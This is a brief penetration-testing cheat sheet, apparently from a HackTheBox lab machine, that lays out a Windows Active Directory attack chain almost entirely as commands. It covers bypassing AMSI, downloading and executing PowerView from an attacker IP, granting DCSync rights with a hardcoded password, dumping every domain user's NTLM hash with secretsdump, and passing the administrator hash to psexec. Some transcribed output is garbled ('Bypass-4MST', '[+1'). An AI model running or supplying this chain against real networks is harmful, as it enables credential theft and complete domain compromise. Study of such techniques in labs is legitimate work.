# Windows

Bypass AMSI

Import PowerView first

```powershell
PS C:\Users\svc-alfresco\Documents> menu
[+] Bypass-4MSI
[+] D11-Loader
[+1 Donut-Loader
[+] Invoke-Binary
PS C:\Users\svc-alfresco\Documents> Bypass-4MST
[+] Patched! :D
PS C:\Users\svc-alfresco\Documents> iex(new-object net.webclient).
downloadstring('http://10.10.14.6/PowerView.ps1')
```



Add DCSync Rights

```powershell
$pass = convertto-securestring 'abc123!' -asplain -force
$cred = new-object system.management.automation.pscredential('htb\john', $pass)
Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync
```



GET NTLM Hashes for all domain users

```bash
secretsdump.py htb/john@10.10.10.161
```



Pass The Hash

```bash
psexec.py administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```
